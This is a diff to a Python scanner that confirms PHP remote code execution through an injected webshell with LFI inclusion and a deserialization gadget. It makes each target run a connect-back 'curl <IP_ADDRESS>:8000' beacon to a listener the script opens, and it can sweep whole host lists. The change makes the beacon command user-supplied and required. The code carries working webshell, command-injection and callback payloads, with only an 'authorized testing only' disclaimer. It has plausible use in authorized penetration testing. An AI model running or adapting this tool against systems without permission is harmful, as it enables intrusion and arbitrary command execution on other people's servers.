@@ -7,20 +7,18 @@
 RCE chains (A + C).
 
 Where scan_hosts.py trusts only markers echoed back in HTTP responses, this
-scanner ALSO proves blind execution: the payload makes the target run
-`curl <attacker-ip>:8000` against a listener this script opens, so RCE is
-confirmed even when the target returns no output. Every attempt uses a
-unique beacon path (`curl <ip>:8000/<tag>`), so a connection identifies
-exactly which technique fired; one bare `curl <ip>:8000` attempt per chain
-(attributed by peer IP) is also made. Supply your own beacon command with
---beacon (e.g. `--beacon 'curl <IP_ADDRESS>:8000'` — placeholders
-<IP_ADDRESS>, <PORT>, <TAG> are substituted).
+scanner ALSO proves blind execution: the payload makes the target run YOUR
+beacon command (--beacon, required) against a listener this script opens, so
+RCE is confirmed even when the target returns no output. Placeholders
+<IP_ADDRESS> (or <IP>), <PORT> and <TAG> in the beacon are substituted per
+attempt: with <TAG> every connection is attributable to the exact technique;
+without it, attempts are attributed by timing window + peer IP (and the
+response body when output is returned).
 
 Techniques tried per target:
   chain A (needs any multipart POST endpoint + an application LFI):
     A1  webshell via filename injection (system($_GET['c'])) + LFI include
-        -> verifiable marker, then blind beacons (bare `curl <ip>:8000`
-        first, then a tagged one)
+        -> verifiable marker, then blind beacons (untagged, then tagged)
     A2  one-shot payloads with ALL exec wrappers (system, passthru,
         shell_exec, exec, popen, backticks) x BOTH injection vectors
         (filename, progress value) — used when the LFI endpoint is known
@@ -30,7 +28,7 @@ Techniques tried per target:
   chain C (needs php_serialize write dir + php read dir + preloaded
   destruct gadget):
     C1  verifiable marker via the ==PROOF== echo or --docker proof file
-    C2  blind beacon: gadget cmd = `curl <ip>:8000` (bare, then tagged)
+    C2  blind beacon through the gadget (untagged, then tagged)
     (no filename vector here: serialized objects need `"` and filenames
     truncate at the first `"`)
 
@@ -41,16 +39,17 @@ paths and peer IPs are recorded; `--ip` pins the target-visible attacker
 address (otherwise auto-detected per target via the routing table).
 
 The target needs a connect-back path to the listener (same network, or any
-egress). `curl` or `wget` must exist on the target.
+egress) and whatever interpreter your beacon command uses (e.g. `curl`).
 
 Verdicts: VULNERABLE (verifiable and/or blind evidence, with the exact
 techniques listed), plus the usual precondition verdicts. Exit code 1 if
 any host is VULNERABLE.
 
 Examples:
-  uv run scan_blind.py --hosts hosts.txt
-  uv run scan_blind.py --target http://127.0.0.1:18081 --docker p2s2-lab
-  uv run scan_blind.py --target 10.0.0.5:80 --ip 10.0.0.1 --listen-port 8000
+  uv run scan_blind.py --hosts hosts.txt --beacon 'curl <IP_ADDRESS>:8000'
+  uv run scan_blind.py http://127.0.0.1:18081 --docker p2s2-lab \
+      --beacon 'curl <IP_ADDRESS>:8000/<TAG>'
+  uv run scan_blind.py 10.0.0.5:80 --ip 10.0.0.1 --beacon 'curl <IP_ADDRESS>:8000'
 
 For authorized testing only — scan only systems you own or may test.
 """
@@ -325,17 +324,16 @@ class BeaconListener(threading.Thread):
                 pass
 
 
-# built-in beacon: quote-free so it fits the filename injection vector;
-# wget fallback for targets without curl. Custom templates via --beacon.
-DEFAULT_BEACON = ("curl -s -m 5 http://{IP}:{PORT}/{TAG} || "
-                  "wget -T 5 -q -O /dev/null http://{IP}:{PORT}/{TAG}")
+# Beacon is user-supplied (--beacon, required). {IP}/{PORT}/{TAG} or
+# <IP_ADDRESS>/<IP>/<PORT>/<TAG> placeholders are substituted at attempt time.
+TAG_PLACEHOLDERS = ("{TAG}", "<TAG>")
 
 
 def template_has_tag(tpl):
-    return "{TAG}" in tpl or "<TAG>" in tpl
+    return any(p in tpl for p in TAG_PLACEHOLDERS)
 
 
-def render_beacon(tpl, ip, port, tag):
+def render_beacon(tpl, ip, port, tag=None):
     t = tpl.replace("{TAG}", tag or "").replace("<TAG>", tag or "")
     t = t.replace("{IP}", ip).replace("<IP_ADDRESS>", ip).replace("<IP>", ip)
     t = t.replace("{PORT}", str(port)).replace("<PORT>", str(port))
@@ -343,7 +341,7 @@ def render_beacon(tpl, ip, port, tag):
 
 
 def beacon_cmd(args, ip, port, tag=None):
-    return render_beacon(args.beacon or DEFAULT_BEACON, ip, port, tag)
+    return render_beacon(args.beacon, ip, port, tag)
 
 
 def local_ip_for(host, port):
@@ -483,23 +481,23 @@ def chain_a_phase(t, args, my_ip, lport, listener, peers):
         res["techniques"].append(f"A1 webshell({wp}) + LFI {lp}?{lp_param} (marker {mk})")
         res["detail"].append(f"LFI include OK: {lp}?{lp_param}")
 
-        # blind via webshell: bare beacon first (peer-attributed), exactly
-        # the configured template with no tag
+        # blind via webshell: the user's beacon with no tag substituted
+        # (attributed by response body, or timing window + peer IP)
         since = time.time()
         r3 = send(host, port, "GET",
                   f"{lp}?{lp_param}={quote(sess_file)}&c={quote(beacon_cmd(args, my_ip, lport))}",
                   scheme=scheme, timeout=args.timeout, verify=args.verify_tls, proxy=args.proxy)
         if r3 and "BEACON-OK" in body_of(r3):
             res["blind"] = True
-            res["techniques"].append("A1 blind beacon via bare curl (response BEACON-OK)")
+            res["techniques"].append("A1 blind beacon (response BEACON-OK)")
         else:
             time.sleep(args.settle)
             if listener and listener.bare_from(peers, since):
                 res["blind"] = True
-                res["techniques"].append("A1 blind beacon via bare curl <ip>:8000")
+                res["techniques"].append("A1 blind beacon (untagged)")
         # tagged beacon for exact attribution (only meaningful if the
         # template carries a <TAG> placeholder)
-        if template_has_tag(args.beacon or DEFAULT_BEACON):
+        if template_has_tag(args.beacon):
             tag = f"Aweb-{nonce(2)}"
             r4 = send(host, port, "GET",
                       f"{lp}?{lp_param}={quote(sess_file)}&c={quote(beacon_cmd(args, my_ip, lport, tag))}",
@@ -520,7 +518,7 @@ def chain_a_phase(t, args, my_ip, lport, listener, peers):
         return res
     lp, lp_param = args.a_lfi_path, args.a_lfi_param
     res["detail"].append(f"webshell marker absent; running one-shot matrix via {lp}?{lp_param}")
-    has_tags = template_has_tag(args.beacon or DEFAULT_BEACON)
+    has_tags = template_has_tag(args.beacon)
     for vec in ("filename", "progress"):
         for wname, wtpl in WRAPPERS:
             for _ in range(args.retries):
@@ -608,7 +606,7 @@ def chain_c_phase(t, args, my_ip, lport, listener, peers):
 
     # C2/C3 blind: bare curl first (peer-attributed), then tagged when the
     # template carries a <TAG> placeholder
-    has_tags = template_has_tag(args.beacon or DEFAULT_BEACON)
+    has_tags = template_has_tag(args.beacon)
     for mode in (("bare", "tagged") if has_tags else ("bare",)):
         for _ in range(args.retries):
             tag = f"Cgad-{nonce(2)}" if mode == "tagged" else None
@@ -628,8 +626,7 @@ def chain_c_phase(t, args, my_ip, lport, listener, peers):
             if hit:
                 res["blind"] = True
                 if mode == "bare":
-                    tech = (f"C2 blind beacon (bare `curl <ip>:{lport}`)"
-                            if not args.beacon else f"C2 blind beacon (custom beacon)")
+                    tech = "C2 blind beacon (untagged)"
                 else:
                     tech = f"C3 blind beacon (tagged {tag})"
                 if tech not in res["techniques"]:
@@ -659,7 +656,7 @@ def scan_target(t, args, listener):
     if not my_ip:
         my_ip = local_ip_for(host, port)
     entry["attacker_ip"] = my_ip
-    entry["beacon_template"] = args.beacon or "built-in (curl||wget + tags)"
+    entry["beacon_template"] = args.beacon
     if not my_ip:
         entry["verdict"] = "NO ROUTE TO TARGET (cannot pick beacon IP)"
         return entry
@@ -721,12 +718,12 @@ def main():
                     help="beacon listener port (default 8000)")
     ap.add_argument("--ip", help="attacker IP as seen by targets "
                                  "(default: auto per target via routing)")
-    ap.add_argument("--beacon", default=None,
-                    help="custom beacon command, e.g. 'curl <IP_ADDRESS>:8000'; "
-                         "placeholders <IP_ADDRESS> (or <IP>), <PORT>, <TAG> are "
-                         "substituted. Without <TAG>, attempts are attributed by "
-                         "timing window + peer IP (default: built-in curl||wget "
-                         "with per-technique tags)")
+    ap.add_argument("--beacon", required=True,
+                    help="REQUIRED beacon command executed on the target, e.g. "
+                         "'curl <IP_ADDRESS>:8000'; placeholders <IP_ADDRESS> (or "
+                         "<IP>), <PORT>, <TAG> are substituted. With <TAG>, every "
+                         "attempt is uniquely attributable; without it, attempts "
+                         "are attributed by timing window + peer IP")
     ap.add_argument("--settle", type=float, default=2.0,
                     help="seconds to wait for a beacon after each blind attempt")
     ap.add_argument("--retries", type=int, default=2,
@@ -804,15 +801,14 @@ def main():
     if listener.alive:
         say(f"[*] beacon listener on {args.listen_host}:{args.listen_port} "
             f"(reply body BEACON-OK; every connection is logged)")
-    if args.beacon:
-        say(f"[*] custom beacon: {args.beacon}")
-        if not template_has_tag(args.beacon):
-            say("[*]   no <TAG> placeholder -> attempts attributed by timing window + peer IP")
-        if "'" in args.beacon or '"' in args.beacon:
-            say("[!]   beacon contains quotes — filename-vector payloads break on "
-                "quotes; progress-value attempts are unaffected")
-        if not re.search(r"(:\d+|<PORT>|\{PORT\})", args.beacon):
-            say(f"[!]   beacon has no port — make sure it targets the listener ({args.listen_port})")
+    say(f"[*] beacon: {args.beacon}")
+    if not template_has_tag(args.beacon):
+        say("[*]   no <TAG> placeholder -> attempts attributed by timing window + peer IP")
+    if "'" in args.beacon or '"' in args.beacon:
+        say("[!]   beacon contains quotes — filename-vector payloads break on "
+            "quotes; progress-value attempts are unaffected")
+    if not re.search(r"(:\d+|<PORT>|\{PORT\})", args.beacon):
+        say(f"[!]   beacon has no port — make sure it targets the listener ({args.listen_port})")
     say(f"[*] scan_blind.py — all techniques: webshell + 6 exec wrappers x 2 "
         f"vectors (A), gadget (C), verifiable markers + blind beacons")
     say(f"[*] {len(targets)} target(s), workers={args.workers}, "
